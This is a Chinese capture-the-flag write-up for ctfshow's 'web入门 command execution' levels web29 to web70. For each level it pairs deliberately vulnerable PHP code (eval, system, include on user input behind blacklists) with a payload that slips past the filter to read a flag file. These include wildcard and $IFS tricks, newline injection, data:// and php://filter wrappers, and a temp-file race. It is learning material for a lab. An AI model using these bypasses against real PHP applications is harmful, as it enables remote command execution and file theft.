# 原创
：  ctfshow web入门-命令执行

# ctfshow web入门-命令执行

#### ctfshow web入门-命令执行

## web29

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
$c=$_GET['c'];
if(!preg_match("/flag/i", $c)){
eval($c);
}

}else{
highlight_file(__FILE__);
}

```

> 
关键词被过滤的话可以考虑通配符绕过


```
*代表任意字符 0 个或多个
?代表任意字符 1 个
[abcd]匹配abcd中一个字符
[a-z]匹配范围 a-z

```

> 
Payload


```
?c=system('cat f*');

```

## web30

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

```

> 
命令执行函数有


```
system()
passthru()   # passthru — 执行外部程序并且显示原始输出
exec()       # exec — 执行一个外部程序  
shell_exec() # shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
popen()
proc_open()
pcntl_exec()
`` 同shell_exec()

```

> 
Payload


```
echo passthru("cat f*");

```

## web31

> 
源码


```
&lt;?php
    
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 

```

> 
cat被过滤可以用


```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
grep  在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行，此时可以使用如下命令： grep test *file
paste  指令会把每个文件以列对列的方式，一列列地加以合并

```

> 
空格被过滤可以用


```
{$IFS}   $IFS$9

&gt; &lt; &lt;&gt; 重定向符
%09(需要php环境)
{cat,flag.php} //用逗号实现了空格功能
%20  

```

> 
Payload


```
?c=echo(\`tac%09f*\`);

```

## web32

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php`

```

## web33

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php

```

## web34

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php

```

## web35

> 
源码


```
&lt;?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php

```

## web36

> 
源码


```
&lt;?php
​
error_reporting(0);
if(isset($_GET['c'])){
$c=$_GET['c'];
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i", $c)){
eval($c);
}

}else{
highlight_file(__FILE__);
}

```

> 
Payload


```
?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php

```

## web37

> 
源码


```
&lt;?php
​
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
$c=$_GET['c'];
if(!preg_match("/flag/i", $c)){
include($c);
echo$flag;

}

}else{
highlight_file(__FILE__);
}

```

> 
Payload


```
?c=data://text/plain,&lt;?php system('cat f*');

```

## web38

> 
源码


```
&lt;?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs=

```

## web39

> 
源码


```
&lt;?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 

```

> 
data://text/plain, 这样就相当于执行了php语句`.php`因为前面的php语句已经闭合了，所以后面的`.php`会被当成html页面直接显示在页面上，起不到什么作用


> 
Payload


```
?c=data://text/plain,&lt;?php system('cat *');?&gt;

```

## web40

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=readfile(next(array_reverse(scandir(getcwd()))));

```

## web41

> 
源码


```
&lt;?php

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?&gt; 

```

> 
Payload


```
&lt;?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i &lt; 256; $i++) { 
	for ($j=0; $j &lt;256 ; $j++) { 

		if($i&lt;16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j&lt;16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);

```

## web42

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." &gt;/dev/null 2&gt;&amp;1");
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
c=cat flag.php;

```

## web43

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
`system()`函数如果不用分号或者截断的话，就和后边的`&gt;/dev/null 2&gt;&amp;1`拼接起来了，不关输入啥都会把结果输出到`/dev/null`


> 
Payload


```
?c=tac flag.php%0a

```

## web44

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

```
?c=tac f*%0a

```

## web45

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=tac%09f*%0a

```

## web46

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=tac%09fla?.php%0a

```

## web47

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
?c=tac%09fla?.php%0a

```

## web48

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
?c=tac%09fla?.php%0a

```

## web49

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=tac%09fla?.php%0a

```

## web50

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." &gt;/dev/null 2&gt;&amp;1");
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=tac&lt;&gt;fla\g.php%0a

```

## web51

> 
源码


```
&lt;?php
​
sset($_GET['c'])){
$c=$_GET['c'];
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
system($c."&gt;/dev/null 2&gt;&amp;1");
}
}else{
highlight_file(__FILE__);
}

```

> 
Payload


```
?c=nl&lt;&gt;fla\g.php%0a

```

## web52

> 
源码


```
&lt;?php
​
if(isset($_GET['c'])){
$c=$_GET['c'];
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){
system($c."&gt;/dev/null 2&gt;&amp;1");
}
}else{
highlight_file(__FILE__);
}

```

> 
Payload


```
?c=nl${IFS}/fla''g%0a

```

## web53

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){
        echo($c);
        $d = system($c);
        echo "&lt;br&gt;".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
?c=nl${IFS}fla''g.php%0a

```

## web54

> 
源码


```
&lt;?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
Payload


```
?c=/bin/?at${IFS}f?ag.php%0a

```

## web55

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}

```

> 



> 
Payload


```
?c=/???/????64 ???????? 或者 ?c=/???/???/????2 ????????

```

## web56

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 

```

> 
可以通过post一个文件(文件里面的sh命令)，在上传的过程中通过`.`去执行执行这个文件，形成条件竞争，一般来说这个文件在linux下面保存在`/tmp/php??????`，一般后面的6个字符是随机生成的有大小写，可以通过linux的匹配符去匹配（注意：通过`.`去执行sh命令不需要有执行权限）


```
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;POST数据包POC&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data"&gt;
&lt;!--链接是当前打开的题目链接--&gt;
    &lt;label for="file"&gt;文件名：&lt;/label&gt;
    &lt;input type="file" name="file" id="file"&gt;&lt;br&gt;
    &lt;input type="submit" name="submit" value="提交"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

```

> 
抓包，构造`?c=.+/???/????????[@-[]`


## web57

> 
源码


```
&lt;?php

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~
$(())))$((~$(())))$((~$(())))))))
或者
?c=grep${IFS}'fla'${IFS}fla??php

```

## web58

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=readfile('flag.php');

```

## web59

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web60

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web61

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web62

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web63

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web64

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web65

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=show_source('flag.php');

```

## web66

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
$c=$_POST['c'];
eval($c);
}else{
highlight_file(__FILE__);
}

```

> 
Payload


```
c=highlight_file('/flag.txt');

```

## web67

> 
源码


```
&lt;?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

> 
Payload


```
c=highlight_file('/flag.txt');

```

## web68

> 
源码


```
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19

```

> 
Payload


```
c=include('/flag.txt');

```

## web69

> 
源码


```
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19

```

> 
`var_export` — 输出或返回一个变量的字符串表示


> 
Payload


```
c=var_export(scandir('/'));`
c=include('/flag.txt');

```

## web70

> 
源码


```
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
​
Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
​
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
你要上天吗？

```

> 
Payload


```
c=var_export(scandir('/'));
c=include('/flag.txt');

```
